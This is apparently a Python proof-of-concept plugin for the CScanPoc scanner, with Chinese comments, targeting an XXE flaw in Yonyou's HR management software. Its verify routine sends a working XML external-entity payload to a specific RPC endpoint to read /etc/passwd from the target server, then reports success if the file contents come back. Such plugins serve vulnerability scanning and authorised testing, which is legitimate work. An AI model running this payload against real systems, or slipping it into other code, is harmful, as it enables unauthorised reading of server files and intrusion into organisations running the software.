# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0024'  # 平台漏洞编号，留空
    name = '用友人力资源管理软件全版本XXE'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XXE  # 漏洞类型
    disclosure_date = '2015-05-31'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友人力资源管理软件全版本XXE漏洞：
        /hrss/dorado/smartweb2.RPC.d?__rpc=true
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=117316'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = '全版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2aaa87b8-800c-4178-9e77-b4985ae65bfc'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bug.php?action=view&id=117316
            hh = hackhttp.hackhttp()
            vul_url = self.target + '/hrss/dorado/smartweb2.RPC.d?__rpc=true'
            payload = (
                '__type=updateData&__viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY test  SYSTEM "file:///etc/passwd" >]><rpc transaction="10" method="resetPwd"><def><dataset type="Custom" id="dsResetPwd"><f name="user"></f></dataset></def><data><rs dataset="dsResetPwd"><r id="10008" state="insert"><n><v>1</v></n></r></rs></data><vps><p name="__profileKeys">%26test;</p></vps></rpc>&1404976068948')
            code, _, body, _, _ = hh.http(vul_url, post=payload)
            if code == 200 and body.find('/usr/bin/passwd') != -1:
                # security_hole(vul_url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
